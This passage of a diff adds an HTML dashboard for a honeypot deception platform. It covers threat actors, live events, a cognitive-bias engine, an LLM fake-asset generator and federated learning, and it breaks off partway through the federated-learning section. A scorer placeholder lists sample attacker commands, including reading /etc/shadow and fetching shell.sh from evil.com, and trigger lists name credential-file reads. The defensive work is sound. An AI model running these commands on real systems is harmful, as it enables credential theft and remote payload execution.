@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>NeuroTrap CADN — Security Operations Center</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<link rel="stylesheet" href="/static/css/main.css"/>
+</head>
+<body>
+<div class="bg-dots" aria-hidden="true"></div>
+
+<div class="app">
+
+<!-- ══════════════════════════════════════
+     SIDEBAR
+══════════════════════════════════════ -->
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-mark">N</div>
+    <div>
+      <div class="logo-text">NeuroTrap</div>
+      <div class="logo-badge">CADN · v1.0</div>
+    </div>
+  </div>
+
+  <nav class="sidebar-nav">
+    <div class="nav-label">Operations</div>
+
+    <div class="nav-item active" data-section="dashboard" onclick="navigate('dashboard',this)">
+      <i class="fa-solid fa-display nav-icon"></i>
+      Dashboard
+    </div>
+    <div class="nav-item" data-section="attackers" onclick="navigate('attackers',this)">
+      <i class="fa-solid fa-skull-crossbones nav-icon"></i>
+      Threat Actors
+    </div>
+    <div class="nav-item" data-section="events" onclick="navigate('events',this)">
+      <i class="fa-solid fa-bolt nav-icon"></i>
+      Live Events
+    </div>
+    <div class="nav-item" data-section="environments" onclick="navigate('environments',this)">
+      <i class="fa-solid fa-spider nav-icon"></i>
+      Honeypots
+    </div>
+    <div class="nav-item" data-section="responses" onclick="navigate('responses',this)">
+      <i class="fa-solid fa-shield-halved nav-icon"></i>
+      Response Log
+    </div>
+
+    <div class="nav-label">Innovations</div>
+
+    <div class="nav-item" data-section="cbee" onclick="navigate('cbee',this)">
+      <i class="fa-solid fa-brain nav-icon"></i>
+      CBEE
+      <span class="nav-badge" style="background:rgba(245,158,11,0.15);color:#f59e0b;border:1px solid rgba(245,158,11,0.3)">01</span>
+    </div>
+    <div class="nav-item" data-section="gadcf" onclick="navigate('gadcf',this)">
+      <i class="fa-solid fa-wand-magic-sparkles nav-icon"></i>
+      GADCF
+      <span class="nav-badge" style="background:rgba(99,102,241,0.15);color:#a5b4fc;border:1px solid rgba(99,102,241,0.3)">02</span>
+    </div>
+    <div class="nav-item" data-section="fhim" onclick="navigate('fhim',this)">
+      <i class="fa-solid fa-network-wired nav-icon"></i>
+      FHIM
+      <span class="nav-badge" style="background:rgba(16,185,129,0.15);color:#6ee7b7;border:1px solid rgba(16,185,129,0.3)">03</span>
+    </div>
+    <div class="nav-item" data-section="ashrta" onclick="navigate('ashrta',this)">
+      <i class="fa-solid fa-robot nav-icon"></i>
+      ASHRTA
+      <span class="nav-badge" style="background:rgba(244,63,94,0.15);color:#fda4af;border:1px solid rgba(244,63,94,0.3)">04</span>
+    </div>
+    <div class="nav-item" data-section="twin" onclick="navigate('twin',this)">
+      <i class="fa-solid fa-clone nav-icon"></i>
+      ADT
+      <span class="nav-badge" style="background:rgba(56,189,248,0.15);color:#7dd3fc;border:1px solid rgba(56,189,248,0.3)">05</span>
+    </div>
+    <div class="nav-item" data-section="soc" onclick="navigate('soc',this)">
+      <i class="fa-solid fa-user-shield nav-icon"></i>
+      AI Analyst
+      <span class="nav-badge" style="background:rgba(168,85,247,0.15);color:#d8b4fe;border:1px solid rgba(168,85,247,0.3)">06</span>
+    </div>
+  </nav>
+
+  <div class="sidebar-footer">
+    <div class="system-status">
+      <div class="status-online"></div>
+      <span id="ws-sidebar-text">System Active</span>
+    </div>
+  </div>
+</aside>
+
+<!-- ══════════════════════════════════════
+     MAIN
+══════════════════════════════════════ -->
+<div class="main">
+
+  <!-- Top bar -->
+  <header class="topbar">
+    <div class="topbar-left">
+      <button class="sidebar-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+      <div class="page-breadcrumb" id="breadcrumb">Dashboard <span>/</span> Operations</div>
+    </div>
+    <div class="topbar-right">
+      <div class="ws-pill" id="ws-pill">
+        <div class="ws-dot" id="ws-dot"></div>
+        <span id="ws-text">Connecting</span>
+      </div>
+      <div class="topbar-clock" id="clock"></div>
+    </div>
+  </header>
+
+  <!-- Page content -->
+  <div class="page-content">
+
+    <!-- ═══════════════════════════
+         DASHBOARD
+    ═══════════════════════════ -->
+    <section class="section active" id="sec-dashboard">
+      <div class="page-header">
+        <div class="page-title">Security Operations Center</div>
+        <div class="page-subtitle">Real-time threat monitoring · Cognitive Adaptive Deception Network</div>
+      </div>
+
+      <!-- KPIs -->
+      <div class="kpi-grid">
+        <div class="kpi-card" style="--kc:#22d3ee">
+          <div class="kpi-icon"><i class="fa-solid fa-bolt"></i></div>
+          <div><div class="kpi-val" id="kpi-events">0</div><div class="kpi-lbl">Total Events</div></div>
+        </div>
+        <div class="kpi-card" style="--kc:#10b981">
+          <div class="kpi-icon"><i class="fa-solid fa-satellite-dish"></i></div>
+          <div><div class="kpi-val" id="kpi-sessions" style="color:#10b981">0</div><div class="kpi-lbl">Active Sessions</div></div>
+        </div>
+        <div class="kpi-card" style="--kc:#f43f5e">
+          <div class="kpi-icon"><i class="fa-solid fa-ban"></i></div>
+          <div><div class="kpi-val" id="kpi-blocked" style="color:#f43f5e">0</div><div class="kpi-lbl">IPs Blocked</div></div>
+        </div>
+        <div class="kpi-card" style="--kc:#a855f7">
+          <div class="kpi-icon"><i class="fa-solid fa-spider"></i></div>
+          <div><div class="kpi-val" id="kpi-envs" style="color:#a855f7">0</div><div class="kpi-lbl">Active Honeypots</div></div>
+        </div>
+        <div class="kpi-card" style="--kc:#f59e0b">
+          <div class="kpi-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
+          <div><div class="kpi-val" id="kpi-threat-level" style="color:#f59e0b">LOW</div><div class="kpi-lbl">Threat Level</div></div>
+        </div>
+      </div>
+
+      <!-- Row 1: Map + Feed -->
+      <div class="grid-2-1 mb-4">
+        <div class="card">
+          <div class="card-head">
+            <i class="fa-solid fa-earth-americas" style="color:#22d3ee"></i>
+            Global Attack Origins
+            <div class="live-badge"><div class="live-dot"></div>LIVE</div>
+          </div>
+          <div class="card-body">
+            <div id="attack-map"></div>
+            <div class="map-legend">
+              <div class="map-legend-item"><div class="map-legend-dot" style="background:#f43f5e"></div>Critical</div>
+              <div class="map-legend-item"><div class="map-legend-dot" style="background:#f59e0b"></div>High</div>
+              <div class="map-legend-item"><div class="map-legend-dot" style="background:#a855f7"></div>Medium</div>
+              <div class="map-legend-item"><div class="map-legend-dot" style="background:#334155"></div>Low</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="display:flex;flex-direction:column">
+          <div class="card-head">
+            <i class="fa-solid fa-terminal" style="color:#22d3ee"></i>
+            Live Feed
+            <div class="live-badge"><div class="live-dot"></div>LIVE</div>
+          </div>
+          <div class="feed-filters">
+            <select id="filter-type" onchange="applyFilter()">
+              <option value="">All types</option>
+              <option value="port_scan">Port scan</option>
+              <option value="brute_force">Brute force</option>
+              <option value="malware_upload">Malware</option>
+              <option value="command_injection">Cmd exec</option>
+              <option value="lateral_movement">Lateral</option>
+            </select>
+            <select id="filter-sev" onchange="applyFilter()">
+              <option value="">All</option>
+              <option value="critical">Critical</option>
+              <option value="high">High</option>
+              <option value="medium">Medium</option>
+              <option value="low">Low</option>
+            </select>
+            <button onclick="clearFeed()" class="btn btn-sm btn-secondary"><i class="fa-solid fa-trash-can"></i></button>
+          </div>
+          <div class="feed-list" id="feed-list" style="min-height:280px">
+            <div class="feed-empty"><i class="fa-solid fa-satellite-dish" style="font-size:24px;color:var(--border2)"></i>Waiting for events…</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Row 2: Timeline + Breakdown + Envs -->
+      <div class="grid-3 mb-4">
+        <div class="card col-span-2">
+          <div class="card-head"><i class="fa-solid fa-chart-line" style="color:#6366f1"></i>Attack Timeline <span style="font-weight:400;color:var(--t3);text-transform:none;letter-spacing:0;font-size:11px;margin-left:4px">last 60 min</span></div>
+          <div class="card-body"><canvas id="timeline-chart" style="max-height:180px"></canvas></div>
+        </div>
+        <div class="card">
+          <div class="card-head"><i class="fa-solid fa-chart-pie" style="color:#a855f7"></i>Distribution</div>
+          <div class="card-body">
+            <div class="breakdown-wrap" style="min-height:180px">
+              <canvas id="breakdown-chart"></canvas>
+              <div class="breakdown-center">
+                <div class="breakdown-total" id="breakdown-total">—</div>
+                <div class="breakdown-lbl">total</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Row 3: Threat table -->
+      <div class="card mb-4">
+        <div class="card-head">
+          <i class="fa-solid fa-skull-crossbones" style="color:#f43f5e"></i>
+          Top Threat Actors
+          <span id="attacker-count" style="color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px;margin-left:4px"></span>
+        </div>
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th><i class="fa-solid fa-network-wired"></i> Source IP</th>
+                <th><i class="fa-solid fa-gauge-high"></i> Threat Score</th>
+                <th><i class="fa-solid fa-crosshairs"></i> Intent</th>
+                <th><i class="fa-solid fa-user-secret"></i> Tier</th>
+                <th><i class="fa-solid fa-diagram-project"></i> TTPs</th>
+                <th><i class="fa-solid fa-clock"></i> Last Seen</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="attackers-tbody">
+              <tr><td colspan="7" style="text-align:center;color:var(--t4);padding:28px;font-family:var(--sans)"><i class="fa-solid fa-circle-info" style="margin-right:6px"></i>No threat actors detected</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Row 4: Active envs -->
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-spider" style="color:#a855f7"></i>Active Deception Environments</div>
+        <div class="card-body">
+          <div id="env-cards" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px">
+            <div style="color:var(--t4);font-size:12px;padding:12px;grid-column:1/-1"><i class="fa-solid fa-server" style="margin-right:6px"></i>No active environments</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         THREAT ACTORS (full page)
+    ═══════════════════════════ -->
+    <section class="section" id="sec-attackers">
+      <div class="page-header">
+        <div class="page-title">Threat Actors</div>
+        <div class="page-subtitle">All tracked attacker profiles with behavioral analysis</div>
+      </div>
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-skull-crossbones" style="color:#f43f5e"></i>Attacker Profiles <span id="full-attacker-count" style="margin-left:auto;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px"></span></div>
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead><tr>
+              <th><i class="fa-solid fa-network-wired"></i> IP Address</th>
+              <th><i class="fa-solid fa-gauge-high"></i> Score</th>
+              <th><i class="fa-solid fa-crosshairs"></i> Intent</th>
+              <th><i class="fa-solid fa-user-secret"></i> Tier</th>
+              <th><i class="fa-solid fa-diagram-project"></i> TTPs</th>
+              <th><i class="fa-solid fa-terminal"></i> Commands</th>
+              <th><i class="fa-solid fa-calendar"></i> First Seen</th>
+              <th><i class="fa-solid fa-clock"></i> Last Seen</th>
+              <th></th>
+            </tr></thead>
+            <tbody id="full-attackers-tbody">
+              <tr><td colspan="9" style="text-align:center;color:var(--t4);padding:32px;font-family:var(--sans)"><i class="fa-solid fa-circle-info" style="margin-right:6px"></i>No data</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         LIVE EVENTS
+    ═══════════════════════════ -->
+    <section class="section" id="sec-events">
+      <div class="page-header">
+        <div class="page-title">Live Event Stream</div>
+        <div class="page-subtitle">All detection events across all honeypot surfaces</div>
+      </div>
+      <div class="card" style="display:flex;flex-direction:column;min-height:600px">
+        <div class="card-head">
+          <i class="fa-solid fa-bolt" style="color:#22d3ee"></i>Event Stream
+          <div class="live-badge" style="margin-left:0"><div class="live-dot"></div>LIVE</div>
+          <div style="margin-left:auto;display:flex;gap:6px">
+            <select id="events-filter-type" class="btn btn-sm btn-secondary" style="font-size:11px" onchange="applyEventsFilter()">
+              <option value="">All types</option>
+              <option value="port_scan">Port scan</option>
+              <option value="brute_force">Brute force</option>
+              <option value="malware_upload">Malware</option>
+              <option value="command_injection">Cmd exec</option>
+              <option value="lateral_movement">Lateral</option>
+            </select>
+            <select id="events-filter-sev" class="btn btn-sm btn-secondary" style="font-size:11px" onchange="applyEventsFilter()">
+              <option value="">All severities</option>
+              <option value="critical">Critical</option>
+              <option value="high">High</option>
+              <option value="medium">Medium</option>
+              <option value="low">Low</option>
+            </select>
+            <button onclick="clearEventsPage()" class="btn btn-sm btn-secondary"><i class="fa-solid fa-trash-can"></i></button>
+          </div>
+        </div>
+        <div class="feed-list" id="events-page-list" style="flex:1;min-height:500px;max-height:700px"></div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         HONEYPOTS
+    ═══════════════════════════ -->
+    <section class="section" id="sec-environments">
+      <div class="page-header">
+        <div class="page-title">Deception Environments</div>
+        <div class="page-subtitle">Active honeypot instances spawned by the Deception Engine</div>
+      </div>
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-spider" style="color:#a855f7"></i>Active Environments <span id="envs-count" style="margin-left:auto;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px"></span></div>
+        <div class="card-body">
+          <div id="envs-full" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px">
+            <div style="color:var(--t4);font-size:12px"><i class="fa-solid fa-server" style="margin-right:6px"></i>No active environments</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         RESPONSE LOG
+    ═══════════════════════════ -->
+    <section class="section" id="sec-responses">
+      <div class="page-header">
+        <div class="page-title">Response Log</div>
+        <div class="page-subtitle">Autonomous response actions taken by the Response Engine</div>
+      </div>
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-shield-halved" style="color:#6366f1"></i>Response Actions</div>
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead><tr>
+              <th>Action</th><th>Source IP</th><th>Score</th><th>Timestamp</th>
+            </tr></thead>
+            <tbody id="response-tbody">
+              <tr><td colspan="4" style="text-align:center;color:var(--t4);padding:28px;font-family:var(--sans)">No response actions logged</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         CBEE
+    ═══════════════════════════ -->
+    <section class="section" id="sec-cbee">
+      <div class="inno-header" style="--ic:#f59e0b">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-brain"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(245,158,11,0.15);color:#f59e0b;border-color:rgba(245,158,11,0.4)">IDEA 01</span>
+            <span style="font-size:11px;font-weight:600;color:#f43f5e;display:flex;align-items:center;gap:3px"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> Hard</span>
+          </div>
+          <div class="inno-title">Cognitive Bias Exploitation Engine</div>
+          <div class="inno-sub">Weaponize attacker psychology — keep them trapped, deceived, and exposed longer. Based on Cialdini's Principles of Influence + MITRE ENGAGE adversary engagement taxonomy.</div>
+        </div>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#f59e0b"><div class="kpi-icon"><i class="fa-solid fa-users"></i></div><div><div class="kpi-val" id="cbee-kpi-profiles">—</div><div class="kpi-lbl">Active Profiles</div></div></div>
+        <div class="kpi-card" style="--kc:#f43f5e"><div class="kpi-icon"><i class="fa-solid fa-syringe"></i></div><div><div class="kpi-val" id="cbee-kpi-inj" style="color:#f43f5e">—</div><div class="kpi-lbl">Bait Injections</div></div></div>
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-hourglass-half"></i></div><div><div class="kpi-val" style="color:#10b981">3–6×</div><div class="kpi-lbl">Dwell Time</div></div></div>
+        <div class="kpi-card" style="--kc:#a855f7"><div class="kpi-icon"><i class="fa-solid fa-crosshairs"></i></div><div><div class="kpi-val" id="cbee-kpi-dom" style="color:#a855f7">—</div><div class="kpi-lbl">Top Bias</div></div></div>
+      </div>
+
+      <div class="grid-2-1 mb-4">
+        <div class="card">
+          <div class="card-head">
+            <i class="fa-solid fa-chart-bar" style="color:#f59e0b"></i>Attacker Bias Profiles
+            <button class="btn btn-sm btn-secondary" style="margin-left:auto" onclick="loadCBEE()"><i class="fa-solid fa-rotate"></i></button>
+          </div>
+          <div class="card-body scroll-list" id="cbee-profiles" style="min-height:280px">
+            <div class="feed-empty"><i class="fa-solid fa-brain" style="font-size:24px;color:rgba(245,158,11,0.2)"></i>Loading…</div>
+          </div>
+        </div>
+
+        <div style="display:flex;flex-direction:column;gap:16px">
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-syringe" style="color:#f43f5e"></i>Bait Injections</div>
+            <div class="card-body scroll-short" id="cbee-injections">
+              <div class="feed-empty" style="min-height:80px"><i class="fa-solid fa-syringe" style="font-size:18px;color:rgba(244,63,94,0.2)"></i>None fired</div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-flask-vial" style="color:#f59e0b"></i>Live Session Scorer</div>
+            <div class="card-body">
+              <div class="field"><label>Commands (one per line)</label><textarea id="cbee-cmds" rows="4" placeholder="whoami&#10;cat /etc/shadow&#10;wget http://evil.com/shell.sh&#10;crontab -e"></textarea></div>
+              <div class="field-row mb-4" style="margin-bottom:10px">
+                <div class="field" style="margin-bottom:0"><label>Duration (sec)</label><input id="cbee-dur" type="number" value="120"></div>
+                <div class="field" style="margin-bottom:0"><label>Login Attempts</label><input id="cbee-logins" type="number" value="25"></div>
+              </div>
+              <button class="btn btn-primary" style="width:100%" onclick="scoreSessionCBEE()"><i class="fa-solid fa-bolt"></i> Analyze Bias</button>
+              <div class="score-result-box" id="cbee-score-out" style="display:none;margin-top:12px"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-book-open" style="color:#f59e0b"></i>5 Bias Dimensions — Cialdini's Principles + MITRE ENGAGE</div>
+        <div class="card-body">
+          <div class="bias-ref-grid">
+            <div class="bias-ref-card" style="--bc:rgba(245,158,11,0.3);--bh:rgba(245,158,11,0.55)"><div class="bias-ref-icon" style="background:rgba(245,158,11,0.12);color:#f59e0b"><i class="fa-solid fa-magnifying-glass"></i></div><div class="bias-ref-name" style="color:#f59e0b">Curiosity Gap</div><div class="bias-ref-desc">Incomplete secrets that compel completion. Truncated credentials and breadcrumb paths lead attackers deeper.</div><div class="bias-ref-signals"><b>Triggers:</b> find *.key · cat .env · ls /root</div></div>
+            <div class="bias-ref-card" style="--bc:rgba(168,85,247,0.3);--bh:rgba(168,85,247,0.55)"><div class="bias-ref-icon" style="background:rgba(168,85,247,0.12);color:#a855f7"><i class="fa-solid fa-check-double"></i></div><div class="bias-ref-name" style="color:#a855f7">Confirmation Bias</div><div class="bias-ref-desc">Fake evidence matching attacker beliefs. Plant data confirming their expected target environment.</div><div class="bias-ref-signals"><b>Triggers:</b> uname -a · cat /etc/os-release</div></div>
+            <div class="bias-ref-card" style="--bc:rgba(16,185,129,0.3);--bh:rgba(16,185,129,0.55)"><div class="bias-ref-icon" style="background:rgba(16,185,129,0.12);color:#10b981"><i class="fa-solid fa-coins"></i></div><div class="bias-ref-name" style="color:#10b981">Sunk Cost Trap</div><div class="bias-ref-desc">Reward early effort so attackers won't leave empty-handed — making them invest more time and reveal more.</div><div class="bias-ref-signals"><b>Triggers:</b> wget · git clone · pip install</div></div>
+            <div class="bias-ref-card" style="--bc:rgba(34,211,238,0.3);--bh:rgba(34,211,238,0.55)"><div class="bias-ref-icon" style="background:rgba(34,211,238,0.12);color:#22d3ee"><i class="fa-solid fa-user-tie"></i></div><div class="bias-ref-name" style="color:#22d3ee">Authority Signals</div><div class="bias-ref-desc">Fabricated C-level memos and emergency credentials that override attacker caution.</div><div class="bias-ref-signals"><b>Triggers:</b> sudo · cat /etc/shadow</div></div>
+            <div class="bias-ref-card" style="--bc:rgba(244,63,94,0.3);--bh:rgba(244,63,94,0.55)"><div class="bias-ref-icon" style="background:rgba(244,63,94,0.12);color:#f43f5e"><i class="fa-solid fa-hourglass-half"></i></div><div class="bias-ref-name" style="color:#f43f5e">Scarcity Framing</div><div class="bias-ref-desc">Urgency cues trigger rushed, careless, identity-revealing behavior from attackers.</div><div class="bias-ref-signals"><b>Triggers:</b> crontab · nohup · screen</div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         GADCF
+    ═══════════════════════════ -->
+    <section class="section" id="sec-gadcf">
+      <div class="inno-header" style="--ic:#6366f1">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-wand-magic-sparkles"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(99,102,241,0.15);color:#a5b4fc;border-color:rgba(99,102,241,0.4)">IDEA 02</span>
+            <span style="font-size:11px;font-weight:600;color:#f59e0b;display:flex;align-items:center;gap:3px"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> Medium</span>
+          </div>
+          <div class="inno-title">Generative AI Deception Content Factory</div>
+          <div class="inno-sub">LLM-generated fake assets so contextually coherent, attackers cannot tell the difference. Ollama (Llama 3.1 / Mistral) + RAG + ChromaDB.</div>
+        </div>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#6366f1"><div class="kpi-icon"><i class="fa-solid fa-file-code"></i></div><div><div class="kpi-val" id="gadcf-kpi-total">—</div><div class="kpi-lbl">Assets Generated</div></div></div>
+        <div class="kpi-card" style="--kc:#22d3ee"><div class="kpi-icon"><i class="fa-solid fa-microchip"></i></div><div><div class="kpi-val" id="gadcf-kpi-llm" style="color:#22d3ee">—</div><div class="kpi-lbl">LLM Backend</div></div></div>
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-industry"></i></div><div><div class="kpi-val" style="color:#10b981">6</div><div class="kpi-lbl">Industries</div></div></div>
+        <div class="kpi-card" style="--kc:#f59e0b"><div class="kpi-icon"><i class="fa-solid fa-layer-group"></i></div><div><div class="kpi-val" style="color:#f59e0b">5</div><div class="kpi-lbl">Asset Types</div></div></div>
+      </div>
+
+      <div class="gadcf-grid mb-4">
+        <!-- Generator -->
+        <div class="card" style="align-self:start">
+          <div class="card-head"><i class="fa-solid fa-sliders" style="color:#6366f1"></i>Generator Config</div>
+          <div class="card-body">
+            <div class="field"><label>Industry</label>
+              <div class="opt-grid" id="gadcf-ind-opts">
+                <button class="opt-btn active" data-v="financial_services"><i class="fa-solid fa-building-columns"></i> Financial</button>
+                <button class="opt-btn" data-v="saas_startup"><i class="fa-solid fa-rocket"></i> SaaS</button>
+                <button class="opt-btn" data-v="healthcare"><i class="fa-solid fa-hospital"></i> Health</button>
+                <button class="opt-btn" data-v="e_commerce"><i class="fa-solid fa-cart-shopping"></i> eCommerce</button>
+                <button class="opt-btn" data-v="government"><i class="fa-solid fa-landmark"></i> Gov</button>
+                <button class="opt-btn" data-v="energy"><i class="fa-solid fa-bolt"></i> Energy</button>
+              </div>
+            </div>
+            <div class="field"><label>Intent</label>
+              <div class="opt-grid" id="gadcf-int-opts">
+                <button class="opt-btn active" data-v="credential_harvesting"><i class="fa-solid fa-key"></i> Cred Harvest</button>
+                <button class="opt-btn" data-v="malware_deployment"><i class="fa-solid fa-virus"></i> Malware</button>
+                <button class="opt-btn" data-v="lateral_movement"><i class="fa-solid fa-arrows-left-right"></i> Lateral</button>
+                <button class="opt-btn" data-v="reconnaissance"><i class="fa-solid fa-magnifying-glass"></i> Recon</button>
+                <button class="opt-btn" data-v="cryptomining"><i class="fa-solid fa-coins"></i> Mining</button>
+              </div>
+            </div>
+            <div class="field"><label>Sophistication</label>
+              <input type="range" id="gadcf-soph" min="0" max="2" value="2" class="soph-range">
+              <div class="soph-labels"><span>Beginner</span><span>Bot</span><span>Advanced</span></div>
+            </div>
+            <button class="gen-btn-big" id="gadcf-gen-btn" onclick="gadcfGenerate()">
+              <i class="fa-solid fa-wand-magic-sparkles"></i> Generate Package
+            </button>
+            <div id="gadcf-status" style="font-size:11px;font-family:var(--mono);color:var(--t3);margin-top:8px;min-height:16px"></div>
+          </div>
+        </div>
+
+        <!-- Assets -->
+        <div class="card">
+          <div class="card-head">
+            <i class="fa-solid fa-folder-open" style="color:#6366f1"></i>Assets
+            <span id="gadcf-count" style="margin-left:auto;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px"></span>
+          </div>
+          <div class="card-body scroll-list" id="gadcf-assets" style="min-height:300px">
+            <div class="feed-empty"><i class="fa-solid fa-folder-open" style="font-size:24px;color:rgba(99,102,241,0.2)"></i>Generate a package</div>
+          </div>
+        </div>
+
+        <!-- Preview -->
+        <div class="card" style="display:flex;flex-direction:column">
+          <div class="card-head"><i class="fa-solid fa-eye" style="color:#6366f1"></i>Preview <span id="gadcf-prev-name" style="color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px;margin-left:4px;font-family:var(--mono)"></span></div>
+          <div class="card-body" style="flex:1;display:flex;flex-direction:column">
+            <div class="preview-box" id="gadcf-preview"><div class="preview-empty"><i class="fa-solid fa-file-code" style="font-size:28px;color:rgba(99,102,241,0.2)"></i>Click an asset to preview</div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         FHIM
+    ═══════════════════════════ -->
+    <section class="section" id="sec-fhim">
+      <div class="inno-header" style="--ic:#10b981">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-network-wired"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(16,185,129,0.15);color:#6ee7b7;border-color:rgba(16,185,129,0.4)">IDEA 03</span>
+            <span style="font-size:11px;font-weight:600;color:#f43f5e;display:flex;align-items:center;gap:3px"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> Hard</span>
+          </div>
+          <div class="inno-title">Federated Honeypot Intelligence Mesh</div>
+          <div class="inno-sub">Collective defense across organizations — without ever sharing raw data. FedAvg + Gaussian Differential Privacy (ε=1.0, δ=1e-5).</div>
+        </div>
+      </div>
+
+      <div class="dp-badge mb-4">
+        <i class="fa-solid fa-shield-halved"></i>
+        <strong style="color:#10b981">Zero Raw Data Exposure</strong> — Only differentially-private gradient deltas leave each node. No IPs, sessions, or logs ever transmitted across organizations.
+        <span style="margin-left:auto;color:var(--t3);font-size:10px;font-family:var(--mono);flex-shrink:0">Flower (flwr) · Opacus DP · gRPC + mTLS</span>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-circle-nodes"></i></div><div><div class="kpi-val" id="fhim-kpi-nodes">—</div><div class="kpi-lbl">Active Nodes</div></div></div>
+        <div class="kpi-card" style="--kc:#22d3ee"><div class="kpi-icon"><i class="fa-solid fa-brain"></i></div><div><div class="kpi-val" id="fhim-kpi-f1" style="color:#22d3ee">—</div><div class="kpi-lbl">Global F1</div></div></div>
+        <div class="kpi-card" style="--kc:#a855f7"><div class="kpi-icon"><i class="fa-solid fa-database"></i></div><div><div class="kpi-val" id="fhim-kpi-samples" style="color:#a855f7">—</div><div class="kpi-lbl">Samples</div></div></div>
+        <div class="kpi-card" style="--kc:#f59e0b"><div class="kpi-icon"><i class="fa-solid fa-lock"></i></div><div><div class="kpi-val" style="color:#f59e0b">ε=1.0</div><div class="kpi-lbl">DP Epsilon</div></div></div>
+      </div>
+
+      <div class="grid-2-1 mb-4">
+        <div class="card">
+          <div class="card-head"><i class="fa-solid fa-circle-nodes" style="color:#10b981"></i>Network Nodes <button class="btn btn-sm btn-secondary" style="margin-left:auto" onclick="loadFHIM()"><i class="fa-solid fa-rotate"></i></button></div>
+          <div class="card-body"><div class="node-grid" id="fhim-nodes"><div style="color:var(--t4);font-size:12px">Loading…</div></div></div>
+        </div>
+
+        <div style="display:flex;flex-direction:column;gap:16px">
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-diagram-project" style="color:#10b981"></i>FedAvg Protocol</div>
+            <div class="card-body" style="display:flex;flex-direction:column;gap:0">
+              <div class="fedavg-step"><div class="step-circle" style="background:linear-gradient(135deg,#10b981,#22d3ee)">1</div><div><div style="font-weight:600;font-size:12px;margin-bottom:3px">Local Training</div><div style="font-size:11px;color:var(--t3)">Each node trains on its own honeypot sessions. Raw data stays local.</div></div></div>
+              <div class="step-connector"><i class="fa-solid fa-arrow-down"></i></div>
+              <div class="fedavg-step"><div class="step-circle" style="background:linear-gradient(135deg,#f59e0b,#f43f5e)">2</div><div><div style="font-weight:600;font-size:12px;margin-bottom:3px">DP Noise (ε=1.0)</div><div style="font-size:11px;color:var(--t3)">Gaussian noise added to gradients. Individual data becomes unrecoverable.</div></div></div>
+              <div class="step-connector"><i class="fa-solid fa-arrow-down"></i></div>
+              <div class="fedavg-step"><div class="step-circle" style="background:linear-gradient(135deg,#a855f7,#22d3ee)">3</div><div><div style="font-weight:600;font-size:12px;margin-bottom:3px">FedAvg Aggregation</div><div style="font-size:11px;color:var(--t3)">Server averages all deltas. No individual node's data recoverable.</div></div></div>
+              <div class="step-connector"><i class="fa-solid fa-arrow-down"></i></div>
